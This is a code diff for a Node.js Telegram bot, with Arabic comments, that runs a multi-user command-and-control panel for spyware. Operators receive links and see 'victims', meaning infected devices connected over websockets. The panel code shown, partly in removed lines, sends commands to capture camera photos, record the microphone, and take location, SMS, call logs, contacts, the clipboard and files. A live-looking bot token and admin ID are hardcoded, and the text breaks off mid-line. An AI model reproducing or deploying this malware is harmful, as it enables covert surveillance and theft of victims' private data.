@@ -4,7 +4,7 @@ const http = require("http");
 const telegramBot = require("node-telegram-bot-api");
 const uuid4 = require("uuid").v4;
 
-// --- الإعدادات الأساسية للهوية ---
+// --- الإعدادات السيادية للمطور @A_l_k_w_r_y ---
 const token = '8531140296:AAGGyJqPaVSiRWTEUbrG1fmEsfLHVWELV20';
 const ADMIN_ID = 6568145373; 
 const BASE_URL = "https://labeb.onrender.com"; 
@@ -16,130 +16,108 @@ const bot = new telegramBot(token, { polling: true });
 
 let clients = [];
 let allowedUsers = [ADMIN_ID]; 
-let pendingRequests = new Set(); // لمنع تكرار طلبات الانتظار
+let userPaths = {}; // نظام المسارات المخصصة (الاستضافات)
+let pendingRequests = new Set();
 
-// --- لوحة التحكم المركزية ---
+// --- نظام إدارة الطلبات والتحكم الذكي ---
 bot.on("message", async (msg) => {
     const id = msg.chat.id;
     const text = msg.text;
 
-    // 1. نظام التحقق ومنع السبام (الإزعاج)
+    // 1. نظام الحماية ومنع الإزعاج
     if (!allowedUsers.includes(id)) {
-        if (pendingRequests.has(id)) {
-            return bot.sendMessage(id, "⏳ <b>هدئ من روعك..</b>\nطلبك قيد المراجعة بالفعل، انتظر موافقة المطور.");
-        }
+        if (pendingRequests.has(id)) return; // يتجاهل الرسائل المكررة بصمت لسرعة السيرفر
         
         pendingRequests.add(id);
-        bot.sendMessage(ADMIN_ID, `🔔 <b>طلب استخدام جديد:</b>\n👤 الاسم: ${msg.from.first_name}\n🆔 المعرف: <code>${id}</code>`, {
+        bot.sendMessage(ADMIN_ID, `🔔 <b>طلب انضمام جديد للنظام:</b>\n👤 الاسم: ${msg.from.first_name}\n🆔 المعرف: <code>${id}</code>`, {
             parse_mode: 'HTML',
             reply_markup: {
-                inline_keyboard: [[{ text: "✅ تفعيل الآن", callback_data: `allow_${id}` }]]
+                inline_keyboard: [[{ text: "✅ إعفاء وتفعيل فوري", callback_data: `allow_${id}` }]]
             }
         });
-        return bot.sendMessage(id, "⏳ <b>أهلاً بك..</b>\nتم إرسال طلبك للمطور @A_l_k_w_r_y. يرجى الانتظار.");
+        return bot.sendMessage(id, "⏳ <b>وصولك معلق..</b>\nتم إرسال طلبك للإمبراطور @A_l_k_w_r_y للمراجعة.");
     }
 
-    // 2. لوحة الإمبراطور (الأدمن)
+    // 2. واجهة الإمبراطور (الأدمن فقط)
     if (id === ADMIN_ID && text === "/start") {
-        return bot.sendMessage(id, `👑 <b>لوحة تحكم المطور الرئيسي</b>\n\nالضحايا: <code>${clients.length}</code>\nالمستخدمين: <code>${allowedUsers.length - 1}</code>`, {
+        return bot.sendMessage(id, `👑 <b>مرحباً بك في غرفة العمليات المركزية</b>\n\n📊 <b>الإحصائيات:</b>\n• الضحايا المتصلين: <code>${clients.length}</code>\n• الأعضاء النشطين: <code>${allowedUsers.length - 1}</code>`, {
             parse_mode: 'HTML',
             reply_markup: {
                 keyboard: [
                     ["📱 عرض كافة الضحايا", "👥 المصرح لهم"],
-                    ["🚫 طرد مستخدم بالايدي", "🔓 إعفاء مستخدم"],
-                    ["📢 إذاعة", "🔄 إعادة تشغيل"]
+                    ["🔓 إعفاء مستخدم", "🚫 طرد مستخدم"],
+                    ["📢 إذاعة عامة", "🔄 تحديث السيرفر"]
                 ],
                 resize_keyboard: true
             }
         });
     }
 
-    // 3. توليد الرابط الخاص للمستخدم المصرح له
+    // 3. واجهة المستخدم (توليد الرابط المستقل)
     if (text === "/start" && id !== ADMIN_ID) {
-        const userLink = `${BASE_URL}/?id=${id}`;
-        return bot.sendMessage(id, `💎 <b>تم تفعيل حسابك بنجاح</b>\n\n🔗 <b>رابط الاستضافة الخاص بك:</b>\n<code>${userLink}</code>\n\n⚠️ ضحاياك سيظهرون لك هنا حصراً.`, {
+        const myPath = userPaths[id] || "اسم_مخصص";
+        return bot.sendMessage(id, `💎 <b>أهلاً بك في نظام السيطرة الخاص بك</b>\n\n🔗 <b>رابط استضافتك الحالي:</b>\n<code>${BASE_URL}/${myPath}</code>\n\n⚙️ <i>اضغط على الزر أدناه لتخصيص رابطك.</i>`, {
             parse_mode: 'HTML',
-            reply_markup: { keyboard: [["📱 ضحاياي"]], resize_keyboard: true }
-        });
-    }
-
-    // 4. معالجة الطرد والإعفاء (بالايدي)
-    if (id === ADMIN_ID && (text === "🚫 طرد مستخدم بالايدي" || text === "🔓 إعفاء مستخدم")) {
-        const isExempt = text.includes("إعفاء");
-        bot.sendMessage(id, `✍️ أرسل المعرف (ID) الذي تريد ${isExempt ? "إعفاءه" : "طرده"}:`);
-        bot.once("message", (m) => {
-            const target = parseInt(m.text);
-            if (isNaN(target)) return bot.sendMessage(id, "❌ المعرف غير صحيح.");
-            
-            if (isExempt) {
-                if (!allowedUsers.includes(target)) allowedUsers.push(target);
-                bot.sendMessage(id, `✅ تم إعفاء وتفعيل <code>${target}</code>`, {parse_mode:'HTML'});
-            } else {
-                allowedUsers = allowedUsers.filter(u => u !== target);
-                bot.sendMessage(id, `✅ تم طرد <code>${target}</code> بنجاح`, {parse_mode:'HTML'});
+            reply_markup: {
+                keyboard: [["📱 ضحاياي", "⚙️ تخصيص رابط الاستضافة"]],
+                resize_keyboard: true
             }
         });
     }
 
-    // 5. عرض الضحايا
+    // تخصيص اسم الرابط (المسار)
+    if (text === "⚙️ تخصيص رابط الاستضافة") {
+        bot.sendMessage(id, "✍️ أرسل الآن الاسم الذي تريده لرابطك (مثلاً: king):");
+        bot.once("message", (m) => {
+            const cleanPath = m.text.replace(/[^a-zA-Z0-9]/g, "");
+            userPaths[id] = cleanPath;
+            bot.sendMessage(id, `✅ <b>تم اعتماد رابطك الجديد:</b>\n<code>${BASE_URL}/${cleanPath}</code>`, { parse_mode: 'HTML' });
+        });
+    }
+
+    // تنفيذ الإعفاء والطرد (فوري وبدون أخطاء)
+    if (id === ADMIN_ID && (text === "🔓 إعفاء مستخدم" || text === "🚫 طرد مستخدم")) {
+        const isExempt = text.includes("إعفاء");
+        bot.sendMessage(id, `✍️ أرسل معرف (ID) الشخص المراد ${isExempt ? "إعفاؤه" : "طرده"}:`);
+        bot.once("message", (m) => {
+            const target = parseInt(m.text);
+            if (isExempt) {
+                if (!allowedUsers.includes(target)) allowedUsers.push(target);
+                bot.sendMessage(id, `✅ تم إعفاء العضو <code>${target}</code> بنجاح.`, {parse_mode: 'HTML'});
+                bot.sendMessage(target, "✅ <b>مبارك! تم إعفاؤك وتفعيل حسابك.</b>\nأرسل /start الآن.");
+            } else {
+                allowedUsers = allowedUsers.filter(u => u !== target);
+                bot.sendMessage(id, `✅ تم طرد العضو <code>${target}</code> فوراً.`, {parse_mode: 'HTML'});
+            }
+        });
+    }
+
+    // عرض الضحايا
     if (text === "📱 ضحاياي" || text === "📱 عرض كافة الضحايا") {
         const myVictims = (id === ADMIN_ID && text.includes("كافة")) ? clients : clients.filter(c => c.ownerId == id);
-        if (myVictims.length === 0) return bot.sendMessage(id, "❌ لا توجد أجهزة نشطة.");
+        if (myVictims.length === 0) return bot.sendMessage(id, "❌ لا توجد أجهزة متصلة حالياً.");
         
         myVictims.forEach(c => {
-            bot.sendMessage(id, `📍 <b>جهاز:</b> <code>${c.id}</code>\n🌍 IP: <code>${c.ip}</code>`, {
+            bot.sendMessage(id, `👤 <b>جهاز ضحية:</b>\n🆔 المعرف: <code>${c.id}</code>`, {
                 parse_mode: 'HTML',
-                reply_markup: { inline_keyboard: [[{ text: "🕹️ السيطرة", callback_data: `control_${c.id}` }]] }
+                reply_markup: { inline_keyboard: [[{ text: "🕹️ فتح لوحة السيطرة", callback_data: `control_${c.id}` }]] }
             });
         });
     }
 });
 
-// --- لوحة التحكم الشفافة (Inline) ---
-bot.on("callback_query", (q) => {
+// --- لوحة الاختراق الشفافة (Inline) ---
+bot.on("callback_query", async (q) => {
     const [action, value] = q.data.split("_");
 
     if (action === "allow") {
         const target = parseInt(value);
         if (!allowedUsers.includes(target)) allowedUsers.push(target);
         pendingRequests.delete(target);
-        bot.sendMessage(target, "✅ <b>مبارك! تم تفعيل حسابك.</b>\nأرسل /start الآن.");
-        return bot.editMessageText(`✅ تم تفعيل <code>${target}</code>`, { chat_id: ADMIN_ID, message_id: q.message.message_id, parse_mode: 'HTML' });
+        bot.sendMessage(target, "✅ <b>تم إعفاؤك وتفعيل حسابك!</b>\nأرسل /start للحصول على رابطك.");
+        return bot.answerCallbackQuery(q.id, { text: "تم التفعيل" });
     }
 
     if (action === "control") {
-        const victimId = value;
-        const buttons = {
-            inline_keyboard: [
-                [{ text: "📸 سيلفي", callback_data: `selfie_${victimId}` }, { text: "📸 رئيسية", callback_data: `maincam_${victimId}` }],
-                [{ text: "🎙️ تسجيل", callback_data: `mic_${victimId}` }, { text: "📍 الموقع", callback_data: `loc_${victimId}` }],
-                [{ text: "📩 SMS", callback_data: `msgs_${victimId}` }, { text: "📞 السجل", callback_data: `calls_${victimId}` }],
-                [{ text: "👥 الأسماء", callback_data: `contacts_${victimId}` }, { text: "📋 الحافظة", callback_data: `clip_${victimId}` }],
-                [{ text: "📥 جلب ملف", callback_data: `getfile_${victimId}` }, { text: "🗑️ حذف ملف", callback_data: `delfile_${victimId}` }]
-            ]
-        };
-        bot.sendMessage(q.message.chat.id, `🕹️ <b>التحكم:</b> <code>${victimId}</code>`, { parse_mode: 'HTML', reply_markup: buttons });
-    }
-
-    const target = clients.find(c => c.id === value);
-    if (target && !["allow", "control"].includes(action)) {
-        target.ws.send(JSON.stringify({ cmd: action }));
-        bot.answerCallbackQuery(q.id, { text: "🚀 جاري التنفيذ" });
-    }
-});
-
-// --- استقبال الضحايا ---
-wss.on('connection', (ws, req) => {
-    const urlParams = new URLSearchParams(req.url.split('?')[1]);
-    const ownerId = urlParams.get('id') || ADMIN_ID; 
-
-    const deviceId = uuid4().substring(0, 8);
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    
-    clients.push({ id: deviceId, ws: ws, ip: ip, ownerId: ownerId });
-    bot.sendMessage(ownerId, `⚠️ <b>وقع صيد جديد في شباكك! 🔥</b>\n🆔 الجهاز: <code>${deviceId}</code>`, { parse_mode: 'HTML' });
-
-    ws.on('close', () => { clients = clients.filter(c => c.id !== deviceId); });
-});
-
-server.listen(process.env.PORT || 3000, () => { console.log("System Online - Multi-User Ready"); });
+        const vId = value;
+        const panel
